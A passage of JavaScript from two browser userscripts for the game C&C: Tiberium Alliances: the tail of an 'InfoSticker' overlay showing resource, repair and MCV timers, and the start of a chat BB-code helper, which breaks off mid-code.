								titleLabel.set(labelStyle); 
								 
								var hidePane = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({ 
									width: 124, 
                                    alignX: "right" 
								}); 
								 
								var hideButton = new qx.ui.form.Button("-").set({ 
									//decorator: new qx.ui.decoration.Single(1, "solid", "black"), 
									maxWidth: 15, 
									maxHeight: 10, 
									//textColor: "black" 
								}); 
                                var self = this; 
								//resourceHideButton.addListener("execute", this.hideResource, this); 
								hideButton.addListener("execute", function () { 
									if (hidePane.isVisible()) { 
										hidePane.exclude(); 
										hideButton.setLabel("+"); 
									} else { 
										hidePane.show(); 
										hideButton.setLabel("-"); 
									} 
									if(self.hasStorage) 
										localStorage["infoSticker-"+visibilityStorageName] = !hidePane.isVisible(); 
								}); 
 
								var titleBar = new qx.ui.container.Composite(new qx.ui.layout.HBox(0)); 
								titleBar.add(hideButton); 
								titleBar.add(titleLabel); 
								pane.add(titleBar); 
								pane.add(hidePane); 
								 
                                if(!visible) hidePane.exclude(); 
                                 
								this.toFlipH.push(pane); 
 
                                this.lastPane = pane; 
								parent.add(pane); 
								 
								return hidePane; 
							} catch(e) { 
								console.log("InfoSticker.createSection: ", e.toString()); 
								throw e; 
							} 
                        }, 
						createHBox: function (ele1, ele2, ele3) { 
							var cnt; 
							cnt = new qx.ui.container.Composite(); 
							cnt.setLayout(new qx.ui.layout.HBox(0)); 
							if (ele1 != null) { 
								cnt.add(ele1); 
								ele1.setAlignY("middle"); 
							} 
							if (ele2 != null) { 
								cnt.add(ele2); 
								ele2.setAlignY("bottom"); 
							} 
							if (ele3 != null) { 
								cnt.add(ele3); 
								ele3.setAlignY("bottom"); 
							} 
 
							return cnt; 
						}, 
                         
                        formatCompactTime: function (time) { 
                            var comps = time.split(":"); 
                             
                            var i = 0; 
                            var value = Math.round(parseInt(comps[i], 10)).toString(); 
                            var len = comps.length; 
                            while(value==0) { 
                                value = Math.round(parseInt(comps[++i], 10)).toString(); 
                                len--; 
                            } 
                            var unit; 
                            switch(len) { 
                                case 1: unit = "s"; break; 
                                case 2: unit = "m"; break; 
                                case 3: unit = "h"; break; 
                                case 4: unit = "d"; break; 
                            } 
                            return value+unit; 
                        }, 
                        createImage: function(icon) { 
                            var image = new qx.ui.basic.Image(icon); 
                            image.setScale(true); 
                            image.setWidth(20); 
                            image.setHeight(20); 
                            return image; 
                        }, 
 
                        createMCVPane: function() { 
                            try { 
                                this.mcvInfoLabel = new qx.ui.basic.Label(); 
                                this.mcvTimerLabel = new qx.ui.basic.Label().set({ 
                                    font: qx.bom.Font.fromString('bold').set({ 
                                            size: 18 
                                        }), 
                                    textColor: '#282828', 
                                    height: 20, 
                                    width: 114, 
                                    textAlign: 'center' 
                                }); 
                                this.mcvTimerCreditProdLabel = new qx.ui.basic.Label().set({ 
                                    font: qx.bom.Font.fromString('normal').set({ 
                                        size: 12 
                                    }), 
                                    textColor: '#282828', 
                                    height: 20, 
                                    width: 114, 
                                    textAlign: 'center', 
                                    marginTop: 4, 
                                    marginBottom: -4 
                                }); 
                                var app = qx.core.Init.getApplication(); 
                                var b3 = app.getBaseNavigationBar().getChildren()[0].getChildren()[0]; 
                                 
                                 
                                var pane = this.createSection(b3, this.mcvInfoLabel, !this.mcvHide, "mcvHide"); 
                                pane.add(this.mcvTimerLabel); 
                                pane.add(this.mcvTimerCreditProdLabel); 
                                this.mcvPane = this.lastPane; 
                                this.lastPane.setMarginLeft(7); 
                                 
                            } catch(e) { 
                                console.log("InfoSticker.createMCVPopup", e.toString()); 
                            } 
                        }, 
                        moveStickerUp: function() { 
                            try { 
                                var baseListBar = this.getBaseListBar(); 
                                this.pinLockPos=Math.max(0, this.pinLockPos-1); 
                                if(baseListBar.indexOf(this.mcvPopup)>=0) { 
                                    baseListBar.remove(this.mcvPopup); 
                                } 
                                if (this.hasStorage) { 
                                    localStorage["infoSticker-pinLock"] = this.pinLockPos.toString(); 
                                } 
                            } catch(e) { 
                                console.log("InfoSticker.moveStickerUp", e.toString()); 
                            } 
                        }, 
                        moveStickerDown: function() { 
                            try { 
                                var baseListBar = this.getBaseListBar(); 
                                this.pinLockPos=Math.min(baseListBar.getChildren().length, this.pinLockPos+1); 
                                if(baseListBar.indexOf(this.mcvPopup)>=0) { 
                                    baseListBar.remove(this.mcvPopup); 
                                } 
                                if (this.hasStorage) { 
                                    localStorage["infoSticker-pinLock"] = this.pinLockPos.toString(); 
                                } 
                            } catch(e) { 
                                console.log("InfoSticker.moveStickerDown", e.toString()); 
                            } 
                        }, 
                        menuUpButton: null, 
                        menuDownButton: null, 
                        createMCVPopup: function() { 
                            try { 
                                var self = this; 
                                this.mcvPopup = new qx.ui.container.Composite(new qx.ui.layout.VBox().set({ 
                                    spacing: 3})).set({ 
                                    paddingLeft: 5, 
                                    width: 105, 
                                    decorator: new qx.ui.decoration.Background() 
                                }); 
                                 
                                var menu = new qx.ui.menu.Menu(); 
                                var menuPinButton = new qx.ui.menu.Button("Pin", "FactionUI/icons/icn_thread_pin_inactive.png"); 
                                menuPinButton.addListener("execute", this.toPin, this); 
                                menu.add(menuPinButton); 
                                var menuLockButton = new qx.ui.menu.Button("Lock", "FactionUI/icons/icn_thread_locked_inactive.png"); 
                                menuLockButton.addListener("execute", this.toLock, this); 
                                menu.add(menuLockButton); 
                                var fileManager = ClientLib.File.FileManager.GetInstance(); 
                                this.menuUpButton = new qx.ui.menu.Button("Move up", fileManager.GetPhysicalPath("ui/icons/icon_tracker_arrow_up.png")); 
                                //ui/icons/icon_tracker_arrow_up.png ui/gdi/icons/cht_opt_arrow_down.png 
                                this.menuUpButton.addListener("execute", this.moveStickerUp, this); 
                                menu.add(this.menuUpButton); 
                                this.menuDownButton = new qx.ui.menu.Button("Move down", fileManager.GetPhysicalPath("ui/icons/icon_tracker_arrow_down.png")); 
                                this.menuDownButton.addListener("execute", this.moveStickerDown, this); 
                                menu.add(this.menuDownButton); 
                                this.mcvPopup.setContextMenu(menu); 
                                if(!this.locked) { 
                                    this.stickerBackground.add(this.mcvPopup); 
                                } 
     
    ////////////////////////////---------------------------------------------------------- 
                                this.pinButton = new webfrontend.ui.SoundButton().set({ 
                                    decorator: "button-forum-light", 
                                    icon: this.pinned ? "FactionUI/icons/icn_thread_pin_active.png" : "FactionUI/icons/icn_thread_pin_inactive.png", 
                                    iconPosition: "top", 
                                    show: "icon", 
                                    cursor: "pointer", 
                                    height: 23, 
                                    width: 50, 
                                    //maxHeight: 25, 
                                    maxWidth: 33, 
                                    maxHeight: 19, 
                                    alignX: "center" 
                                }); 
                                this.pinButton.addListener("execute", this.toPin, this); 
                                 
                                this.pinPane = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({ 
                                    //width: 50, 
                                    maxWidth: 37, 
                                }); 
                                 
                                this.updatePinButtonDecoration(); 
                                 
                                this.pinPane.setDecorator(this.pinButtonDecoration); 
                                this.pinPane.add(this.pinButton); 
                                //this.mcvPopup.add(this.pinPane); 
                                //this.toFlipH.push(this.pinPane); 
                                 
                                var icon = this.pinButton.getChildControl("icon"); 
                                icon.setWidth(15); 
                                icon.setHeight(15); 
                                icon.setScale(true); 
    ////////////////////////////---------------------------------------------------------- 
                                this.lockButton = new webfrontend.ui.SoundButton().set({ 
                                    decorator: "button-forum-light", 
                                    icon: this.pinned ? "FactionUI/icons/icn_thread_locked_active.png" : "FactionUI/icons/icn_thread_locked_inactive.png", 
                                    iconPosition: "top", 
                                    show: "icon", 
                                    cursor: "pointer", 
                                    height: 23, 
                                    width: 50, 
                                    //maxHeight: 25, 
                                    maxWidth: 33, 
                                    maxHeight: 19, 
                                    alignX: "center" 
                                }); 
                                this.lockButton.addListener("execute", this.toLock, this); 
                                 
                                this.lockPane = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({ 
                                    //width: 50, 
                                    maxWidth: 37, 
                                }); 
                                 
                                this.updateLockButtonDecoration(); 
                                 
                                this.lockPane.setDecorator(this.lockButtonDecoration); 
                                this.lockPane.add(this.lockButton); 
                                //this.mcvPopup.add(this.pinPane); 
                                //this.toFlipH.push(this.pinPane); 
                                 
                                icon = this.lockButton.getChildControl("icon"); 
                                icon.setWidth(15); 
                                icon.setHeight(15); 
                                icon.setScale(true); 
    ////////////////////////////---------------------------------------------------------- 
                                this.resourceTitleLabel = new qx.ui.basic.Label(); 
                                this.resourceTitleLabel.setValue("Base"); 
                                var resStyle = { 
                                    font: qx.bom.Font.fromString('bold').set({ 
                                            size: 14 
                                        }), 
                                    textColor: '#282828', 
                                    height: 20, 
                                    width: 65, 
                                    marginLeft: -10, 
                                    textAlign: 'right' 
                                }; 
                                 
                                this.resourceLabel1 = new qx.ui.basic.Label().set(resStyle); 
                                this.resourceLabel2 = new qx.ui.basic.Label().set(resStyle); 
                                this.resourceLabel3 = new qx.ui.basic.Label().set(resStyle); 
                                 
                                var perStyle = { 
                                    font: qx.bom.Font.fromString('bold').set({ 
                                        size: 9 
                                    }), 
                                    textColor: '#282828', 
                                    height: 18, 
                                    width: 33, 
                                    textAlign: 'right' 
                                }; 
                                this.resourceLabel1per = new qx.ui.basic.Label().set(perStyle); 
                                this.resourceLabel2per = new qx.ui.basic.Label().set(perStyle); 
                                this.resourceLabel3per = new qx.ui.basic.Label().set(perStyle); 
                                 
                                 
                                var pane3 = this.createSection(this.mcvPopup, this.resourceTitleLabel, !this.resourceHide, "resourceHide"); 
                                 
                                 
                                this.repairTimerLabel = new qx.ui.basic.Label().set({ 
                                    font: qx.bom.Font.fromString('bold').set({ 
                                        size: 16 
                                    }), 
                                    textColor: '#282828', 
                                    height: 20, 
                                    width: 85, 
                                    marginLeft: 0, 
                                    textAlign: 'center' 
                                }); 
                                pane3.add(this.createHBox(this.createImage(this.repairIcon), this.repairTimerLabel)); 
                                 
                                pane3.add(this.createHBox(this.createImage(this.tibIcon), this.resourceLabel1, this.resourceLabel1per)); 
                                pane3.add(this.createHBox(this.createImage(this.cryIcon), this.resourceLabel2, this.resourceLabel2per)); 
                                pane3.add(this.createHBox(this.createImage(this.powIcon), this.resourceLabel3, this.resourceLabel3per)); 
                                 
                                var mcvC = this.mcvPopup.getChildren(); 
                                mcvC[mcvC.length-1].getChildren()[0].add(this.pinPane); 
                                mcvC[mcvC.length-1].getChildren()[0].add(this.lockPane); 
    ////////////////////////////---------------------------------------------------------- 
     
                                this.productionTitleLabel = new qx.ui.basic.Label(); 
                                this.productionTitleLabel.setValue("Productions"); 
                                 
                                var productionStyle = { 
                                    font: qx.bom.Font.fromString('bold').set({ 
                                        size: 13 
                                    }), 
                                    textColor: '#282828', 
                                    height: 20, 
                                    width: 60, 
                                    textAlign: 'right', 
                                    marginTop: 2, 
                                    marginBottom: -2 
                                }; 
                                this.productionLabelPower = new qx.ui.basic.Label().set(productionStyle); 
                                this.productionLabelCredit = new qx.ui.basic.Label().set(productionStyle); 
                                 
                                var pane4 = this.createSection(this.mcvPopup, this.productionTitleLabel, !this.productionHide, "productionHide"); 
                                pane4.add(this.createHBox(this.createImage(this.powIcon), this.productionLabelPower)); 
                                pane4.add(this.createHBox(this.createImage(this.creditIcon), this.productionLabelCredit)); 
    ////////////////////////////---------------------------------------------------------- 
                            } catch(e) { 
                                console.log("InfoSticker: createMCVPopup", e.toString()); 
                            } 
                        }, 
                        currentCityChange: function() { 
                            this.calculateInfoData(); 
                            this.repositionSticker(); 
                        }, 
                        disposeRecover: function() { 
                             
                            try { 
                                if(this.mcvPane.isDisposed()) { 
                                    this.createMCVPane(); 
                                } 
                                 
                                if(this.mcvPopup.isDisposed()) { 
                                    this.createMCVPopup(); 
                                     
                                    this.repositionSticker(); 
                                } 
                                this.waitingRecovery = false; 
                            } catch(e) { 
                                console.log("InfoSticker: disposeRecover", e.toString()); 
                            } 
                             
                        }, 
                        waitingRecovery: false, 
                        citiesChange: function() { 
                            try { 
                                var self = this; 
                                var baseListBar = this.getBaseListBar(); 
                                this.disposeRecover(); 
                                 
                                if(baseListBar.indexOf(this.mcvPopup)>=0) { 
                                    baseListBar.remove(this.mcvPopup); 
                                    this.mcvPopup.dispose(); 
                                } 
                                 
                                if(baseListBar.indexOf(this.mcvPane)>=0) { 
                                    baseListBar.remove(this.mcvPane); 
                                    this.mcvPane.dispose(); 
                                } 
                                if(!this.waitingRecovery) { 
                                    this.waitingRecovery = true; 
                                    window.setTimeout(function () { 
                                        self.disposeRecover(); 
                                    }, 10); 
                                } 
                            } catch(e) { 
                                console.log("InfoSticker: citiesChange", e.toString()); 
                            } 
                        }, 
                        calculateInfoData: function () { 
                            try { 
                                var self = this; 
                                var player = ClientLib.Data.MainData.GetInstance().get_Player(); 
                                var cw = player.get_Faction(); 
                                var cj = ClientLib.Base.Tech.GetTechIdFromTechNameAndFaction(ClientLib.Base.ETechName.Research_BaseFound, cw); 
                                var cr = player.get_PlayerResearch(); 
                                var cd = cr.GetResearchItemFomMdbId(cj); 
                                 
                                var app = qx.core.Init.getApplication(); 
                                var b3 = app.getBaseNavigationBar().getChildren()[0].getChildren()[0]; 
                                if(b3.getChildren().length==0) return; 
                                if (!this.infoSticker) { 
                                    this.infoSticker = new qx.ui.container.Composite(new qx.ui.layout.VBox().set({ 
                                        alignX: "right" 
                                    })).set({ 
                                        width: 105, 
                                    }); 
 
                                    var top = 130; 
                                    if (this.hasStorage) { 
                                        var l = localStorage["infoSticker-locked"] == "true"; 
                                        if (l != null) { 
                                            this.locked = l; 
                                            var pl = localStorage["infoSticker-pinLock"]; 
                                            if(pl!=null) { 
                                                try { 
                                                	this.pinLockPos = parseInt(pl, 10); 
                                                } catch(etm) {} 
                                            } 
                                        } 
                                         
                                        var p = localStorage["infoSticker-pinned"]; 
                                        var t = localStorage["infoSticker-top"]; 
                                        if (p != null && t != null) { 
                                            var tn; 
                                            try { 
                                                this.pinned = p == "true"; 
                                                if (this.pinned) { 
                                                    tn = parseInt(t, 10); 
                                                    top = tn; 
                                                } 
                                            } catch (etn) {} 
                                        } 
                                        this.mcvHide = localStorage["infoSticker-mcvHide"] == "true"; 
                                        this.repairHide = localStorage["infoSticker-repairHide"] == "true"; 
                                        this.resourceHide = localStorage["infoSticker-resourceHide"] == "true"; 
                                        this.productionHide = localStorage["infoSticker-productionHide"] == "true"; 
                                    } 
                                     
                                     
                                    app.getDesktop().add(this.infoSticker, { 
                                        right: 124, 
                                        top: top 
                                    }); 
                                    if(this.locked) { 
                                        this.infoSticker.hide(); 
                                    } 
 
                                    this.stickerBackground = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({ 
                                        //paddingLeft: 5, 
                                        width: 105, 
                                        decorator: new qx.ui.decoration.Background().set({ 
                                            backgroundImage: "webfrontend/ui/common/bgr_region_world_select_scaler.png", 
                                            backgroundRepeat: "scale", 
                                        }) 
                                    }); 
                                     
                                    this.createMCVPane(); 
                                    this.createMCVPopup(); 
									 
                                    if(this.locked && this.pinned) { 
                                        this.menuUpButton.setEnabled(true); 
                                        this.menuDownButton.setEnabled(true); 
                                    } else { 
                                        this.menuUpButton.setEnabled(false); 
                                        this.menuDownButton.setEnabled(false); 
                                    } 
                                     
                                    this.top_image = new qx.ui.basic.Image("webfrontend/ui/common/bgr_region_world_select_end.png"); 
                                    this.infoSticker.add(this.top_image); 
 
                                    this.infoSticker.add(this.stickerBackground); 
                                    //this.infoSticker.add(this.mcvPopup); 
 
                                    this.bot_image = new qx.ui.basic.Image("webfrontend/ui/common/bgr_region_world_select_end.png"); 
                                    this.infoSticker.add(this.bot_image); 
 
                                    this.runPositionTimer(); 
 
                                    try { 
                                        this.attachEvent(ClientLib.Data.MainData.GetInstance().get_Cities(), "CurrentOwnChange", ClientLib.Data.CurrentOwnCityChange, this, this.currentCityChange); 
                                        this.attachEvent(ClientLib.Data.MainData.GetInstance().get_Cities(), "Change", ClientLib.Data.CitiesChange, this, this.citiesChange); 
                                    } catch(eventError) { 
                                        console.log("InfoSticker.EventAttach:", eventError); 
                                        console.log("The script will continue to run, but with slower response speed."); 
                                    } 
                                } 
                                this.disposeRecover(); 
                                 
                                if (cd == null) { 
                                    if (this.mcvPopup) { 
                                        //this.mcvInfoLabel.setValue("MCV ($???)"); 
                                        this.mcvInfoLabel.setValue("MCV<br>$???"); 
                                        this.mcvTimerLabel.setValue("Loading"); 
                                    } 
                                } else { 
                                    var nextLevelInfo = cd.get_NextLevelInfo_Obj(); 
                                    var resourcesNeeded = []; 
                                    for (var i in nextLevelInfo.rr) { 
                                        if (nextLevelInfo.rr[i].t > 0) { 
                                            resourcesNeeded[nextLevelInfo.rr[i].t] = nextLevelInfo.rr[i].c; 
                                        } 
                                    } 
                                    //var researchNeeded = resourcesNeeded[ClientLib.Base.EResourceType.ResearchPoints]; 
                                    //var currentResearchPoints = player.get_ResearchPoints(); 
                                    var creditsNeeded = resourcesNeeded[ClientLib.Base.EResourceType.Gold]; 
                                    var creditsResourceData = player.get_Credits(); 
                                    var creditGrowthPerHour = (creditsResourceData.Delta + creditsResourceData.ExtraBonusDelta) * ClientLib.Data.MainData.GetInstance().get_Time().get_StepsPerHour(); 
                                    var creditTimeLeftInHours = (creditsNeeded - player.GetCreditsCount()) / creditGrowthPerHour; 
                                    this.mcvInfoLabel.setValue("MCV ($ " + this.formatNumbersCompact(creditsNeeded) + ")"); 
                                    //this.mcvInfoLabel.setValue("MCV<br>$" + this.formatNumbersCompact(creditsNeeded)); 
                                    this.mcvTimerCreditProdLabel.setValue("at " + this.formatNumbersCompact(creditGrowthPerHour) + "/h"); 
                                    if (creditTimeLeftInHours <= 0) { 
                                        this.mcvTimerLabel.setValue("Ready"); 
                                    } else if (creditGrowthPerHour == 0) { 
                                        this.mcvTimerLabel.setValue("Never"); 
                                    } else { 
                                        if(creditTimeLeftInHours >= 24 * 100) { 
                                            this.mcvTimerLabel.setValue("> 99 days"); 
                                        } else { 
                                            this.mcvTimerLabel.setValue(this.FormatTimespan(creditTimeLeftInHours * 60 * 60)); 
                                        } 
                                    } 
                                } 
 
                                var ncity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
                                if (ncity == null) { 
                                    if (this.mcvPopup) { 
                                        this.repairTimerLabel.setValue("Select a base"); 
 
                                        this.resourceLabel1.setValue("N/A"); 
                                        this.resourceLabel2.setValue("N/A"); 
                                        this.resourceLabel3.setValue("N/A"); 
                                    } 
                                } else { 
 
                                    var rt = Math.min(ncity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeInf), 
                                    ncity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeVeh), 
                                    ncity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeAir)); 
                                    if (ncity.get_CityUnitsData().get_UnitLimitOffense() == 0) { 
                                        this.repairTimerLabel.setValue("No army"); 
                                    } else { 
                                        this.repairTimerLabel.setValue(this.FormatTimespan(rt)); 
                                    } 
 
                                    var tib = ncity.GetResourceCount(ClientLib.Base.EResourceType.Tiberium); 
                                    var tibMax = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.Tiberium); 
                                    var tibRatio = tib / tibMax; 
                                    this.resourceLabel1.setTextColor(this.formatNumberColor(tib, tibMax)); 
                                    this.resourceLabel1.setValue(this.formatNumbersCompact(tib)); 
                                    this.resourceLabel1per.setValue(this.formatPercent(tibRatio)); 
 
                                    var cry = ncity.GetResourceCount(ClientLib.Base.EResourceType.Crystal); 
                                    var cryMax = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.Crystal); 
                                    var cryRatio = cry / cryMax; 
                                    this.resourceLabel2.setTextColor(this.formatNumberColor(cry, cryMax)); 
                                    this.resourceLabel2.setValue(this.formatNumbersCompact(cry)); 
                                    this.resourceLabel2per.setValue(this.formatPercent(cryRatio)); 
 
                                    var power = ncity.GetResourceCount(ClientLib.Base.EResourceType.Power); 
                                    var powerMax = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.Power); 
                                    var powerRatio = power / powerMax; 
                                    this.resourceLabel3.setTextColor(this.formatNumberColor(power, powerMax)); 
                                    this.resourceLabel3.setValue(this.formatNumbersCompact(power)); 
                                    this.resourceLabel3per.setValue(this.formatPercent(powerRatio)); 
 
                                    var powerCont = ncity.GetResourceGrowPerHour(ClientLib.Base.EResourceType.Power, false, false); 
                                    var powerBonus = ncity.GetResourceBonusGrowPerHour(ClientLib.Base.EResourceType.Power); 
                                    var alliance = ClientLib.Data.MainData.GetInstance().get_Alliance(); 
                                    var powerAlly = alliance.GetPOIBonusFromResourceType(ClientLib.Base.EResourceType.Power); 
                                    var powerProd = powerCont + powerBonus + powerAlly; 
 
                                    var creditCont = ClientLib.Base.Resource.GetResourceGrowPerHour(ncity.get_CityCreditsProduction(), false); 
                                    var creditBonus = ClientLib.Base.Resource.GetResourceBonusGrowPerHour(ncity.get_CityCreditsProduction(), false); 
                                    var creditProd = creditCont + creditBonus; 
 
                                    this.productionLabelPower.setValue(this.formatNumbersCompact(powerProd) + "/h"); 
                                    this.productionLabelCredit.setValue(this.formatNumbersCompact(creditProd) + "/h"); 
                                } 
                            } catch (e) { 
                                console.log("InfoSticker.calculateInfoData", e.toString()); 
                            } 
                        }, 
                        formatPercent: function (value) { 
                            return value > 999 / 100 ? ">999%" : this.formatNumbersCompact(value * 100, 0) + "%"; 
                            //return this.formatNumbersCompact(value*100, 0) + "%"; 
                        }, 
                        formatNumberColor: function (value, max) { 
                            var ratio = value / max; 
 
                            var color; 
                            var black = [40, 180, 40]; 
                            var yellow = [181, 181, 0]; 
                            var red = [187, 43, 43]; 
 
                            if (ratio < 0.5) color = black; 
                            else if (ratio < 0.75) color = this.interpolateColor(black, yellow, (ratio - 0.5) / 0.25); 
                            else if (ratio < 1) color = this.interpolateColor(yellow, red, (ratio - 0.75) / 0.25); 
                            else color = red; 
 
                            //console.log(qx.util.ColorUtil.rgbToHexString(color)); 
                            return qx.util.ColorUtil.rgbToHexString(color); 
                        }, 
                        interpolateColor: function (color1, color2, s) { 
                            //console.log("interp "+s+ " " + color1[1]+" " +color2[1]+" " +(color1[1]+s*(color2[1]-color1[1]))); 
                            return [Math.floor(color1[0] + s * (color2[0] - color1[0])), 
                            Math.floor(color1[1] + s * (color2[1] - color1[1])), 
                            Math.floor(color1[2] + s * (color2[2] - color1[2]))]; 
                        }, 
                        formatNumbersCompact: function (value, decimals) { 
                            if (decimals == undefined) decimals = 2; 
                            var valueStr; 
                            var unit = ""; 
                            if (value < 1000) valueStr = value.toString(); 
                            else if (value < 1000 * 1000) { 
                                valueStr = (value / 1000).toString(); 
                                unit = "k"; 
                            } else if (value < 1000 * 1000 * 1000) { 
                                valueStr = (value / 1000000).toString(); 
                                unit = "M"; 
                            } else { 
                                valueStr = (value / 1000000000).toString(); 
                                unit = "G"; 
                            } 
                            if (valueStr.indexOf(".") >= 0) { 
                                var whole = valueStr.substring(0, valueStr.indexOf(".")); 
                                if (decimals === 0) { 
                                    valueStr = whole; 
                                } else { 
                                    var fraction = valueStr.substring(valueStr.indexOf(".") + 1); 
                                    if (fraction.length > decimals) fraction = fraction.substring(0, decimals); 
                                    valueStr = whole + "." + fraction; 
                                } 
                            } 
 
                            valueStr = valueStr + unit; 
                            return valueStr; 
                        }, 
                        FormatTimespan: function (value) { 
                            var i; 
                            var t = ClientLib.Vis.VisMain.FormatTimespan(value); 
                            var colonCount = 0; 
                            for (i = 0; i < t.length; i++) { 
                                if (t.charAt(i) == ':') colonCount++; 
                            } 
                            var r = ""; 
                            for (i = 0; i < t.length; i++) { 
                                if (t.charAt(i) == ':') { 
                                    if (colonCount > 2) { 
                                        r += "d "; 
                                    } else { 
                                        r += t.charAt(i); 
                                    } 
                                    colonCount--; 
                                } else { 
                                    r += t.charAt(i); 
                                } 
                            } 
                            return r; 
                        } 
                    } 
                }); 
            } 
        } catch (e) { 
            console.log("InfoSticker: createInfoSticker: ", e.toString()); 
        } 
 
        function InfoSticker_checkIfLoaded() { 
            try { 
                if (typeof qx != 'undefined' && qx.core.Init.getApplication() && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION) && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION).isVisible()) { 
                    createInfoSticker(); 
                    window.InfoSticker.Base.getInstance().initialize(); 
                } else { 
                    window.setTimeout(InfoSticker_checkIfLoaded, 1000); 
                } 
            } catch (e) { 
                console.log("InfoSticker_checkIfLoaded: ", e.toString()); 
            } 
        } 
        if (/commandandconquer\.com/i.test(document.domain)) { 
            window.setTimeout(InfoSticker_checkIfLoaded, 1000); 
        } 
    } 
    try { 
        var InfoStickerScript = document.createElement("script"); 
        InfoStickerScript.innerHTML = "(" + InfoSticker_main.toString() + ")();"; 
        InfoStickerScript.type = "text/javascript"; 
        if (/commandandconquer\.com/i.test(document.domain)) { 
            document.getElementsByTagName("head")[0].appendChild(InfoStickerScript); 
        } 
    } catch (e) { 
        console.log("InfoSticker: init error: ", e.toString()); 
    } 
})();




// ==UserScript== 
// @name        C&C: Tiberium Alliances Chat Helper Enhanced 
// @namespace   https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @description Automates the use of chat and message BB-Codes: [coords][url][player][alliance][b][i][s][u] - Contact list for whispering - Type /chelp <enter> in chat for help. 
// @include     https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version     3.1.6 
// @updateURL   https://userscripts.org/scripts/source/152177.meta.js 
// @downloadURL https://userscripts.org/scripts/source/152177.user.js 
// @icon        https://sites.google.com/site/titlemod/home/favicon.png 
// @grant       none 
// ==/UserScript== 
 
// type: /chelp in any text box and hit <enter> for a list of commands 
 
// Please report urls that are not tagged properly 
 
// window.chatHelper_suppressBrowserAltKeys suppresses normal browser menu keys [Alt+(a,p,b,i,u,s)] when you are in a textarea so that the menus don't open. 
 
(function () { 
	var chatHelper_main = function () { 
		window.chatHelper_debug = 0; //initial debug level, top level for easy console access 
		var chlog = function chlog(str,lvl){ 
			if (lvl > 0) { //lvl 1+ 
				if (window.chatHelper_debug == 1) { // lvl 1 
					console.log("ChatHelper_debug: "+str+"\n"); 
				} 
				if (window.chatHelper_debug == 2) { // lvl 2 
					console.log("ChatHelper_debug: "+str+"\n"); 
				} 
				 
			} else { //lvl 0 or no arg passed to lvl 
				console.log("ChatHelper_log: "+str+"\n"); 
			} 
		}; 
		try { 
			function createchatHelper() { 
				var onkeyupDelay = 50; //ms to wait after a keyupevent before searching contacts list. Lower for faster searching. Higher for better performance. 
				window.chatHelper_suppressBrowserAltKeys = true; 
				window.chatHelper_version = "3.1.6"; 
				window.chatHelper_name = "C&C: Tiberium Alliances Chat Helper Enhanced"; 
				chlog(window.chatHelper_name + ' v' + window.chatHelper_version + ': loading.',0); 
				var saveObj = { 
					saveObjVer : "3.1.6", 
					contacts : [] 
				} 
				 
				var validCharPatt = /[-\w\.]/; 
				var isWhisp = false; 
				var contacts = []; 
				var timer; 
				var _sub; 
 
				 
				function getCaretPos(obj) { 
					// getCaretPos from: http://userscripts.org/scripts/show/151099 
					obj.focus(); 
					 
					if (obj.selectionStart) { 
						return obj.selectionStart; //Gecko 
					} else if (document.selection) //IE 
					{ 
						var sel = document.selection.createRange(); 
						var clone = sel.duplicate(); 
						sel.collapse(true); 
						clone.moveToElementText(obj); 
						clone.setEndPoint('EndToEnd', sel); 
						return clone.text.length; 
					} 
					 
					return 0; 
				} 
				 
				function moveCaret(inputObject, pos) { 
					// moveCaretPos from: http://userscripts.org/scripts/show/151099 
					if (inputObject.selectionStart) { 
						inputObject.setSelectionRange(pos, pos); 
						inputObject.focus(); 
					} 
				} 
				 
				function getCursorWordPos(inputField) { 
					var pos = getCaretPos(inputField); 
					var inText = inputField.value; 
					var lc = inText.charAt(pos - 1); 
					if (lc.match(validCharPatt) != null) { 
						var sPos = pos; 
						var ePos = pos; 
						var t = inputField.value; 
						while (sPos >= 0 && t.charAt(sPos - 1).match(validCharPatt) != null) { 
							sPos--; 
						} 
						while (ePos <= t.length && t.charAt(ePos).match(validCharPatt) != null) { 
							ePos++; 
						} 
						//inputField.setSelectionRange(sPos,ePos); 
						return [sPos, ePos]; 
					} 
				} 
				 
				function tagWith(tag, inputField) { 
					var eTag = tag.replace('[', '[/'); //closing tag 
					var tagLen = tag.length; 
					var eTagLen = eTag.length; 
					if (inputField != null) { 
						var pos = getCaretPos(inputField); 
						var inText = inputField.value; 
						//save scroll position 
						if (inputField.type === 'textarea') 
							var st = inputField.scrollTop; 
						//if there is selected text 
						if (inputField.selectionStart !== inputField.selectionEnd) { 
							var a = inText.slice(0, inputField.selectionStart); 
							var b = inText.slice(inputField.selectionStart, inputField.selectionEnd); 
							var c = inText.slice(inputField.selectionEnd, inText.length); 
							inputField.value = a + tag + b + eTag + c; 
							moveCaret(inputField, pos + tagLen + eTagLen + b.length); 
							//if ((input IS empty) OR (the last char was a space)) AND next char ISNOT a left sqbracket 
						} else if ((inText === "" || inText.charAt(pos - 1) === " ") && (inText.charAt(pos) !== '[')) { 
							inputField.value = inText.substr(0, pos) + tag + eTag + inText.substr(pos, inText.length); 
							moveCaret(inputField, pos + tagLen); 
							//if last character is a valid playername character 
						} else if (inText.charAt(pos - 1).match(validCharPatt) != null) { 
							var arr = getCursorWordPos(inputField); // 
							var s = arr[0]; 
							var e = arr[1]; 
							inputField.value = inText.slice(0, s) + tag + inText.slice(s, e) + eTag + inText.slice(e, inText.length); 
							moveCaret(inputField, e + tagLen + eTagLen); 
						} 
						//restore scroll position 
						if (inputField.type === 'textarea') 
							inputField.scrollTop = st; 
					} 
				} 
				 
				function showHelp() { 
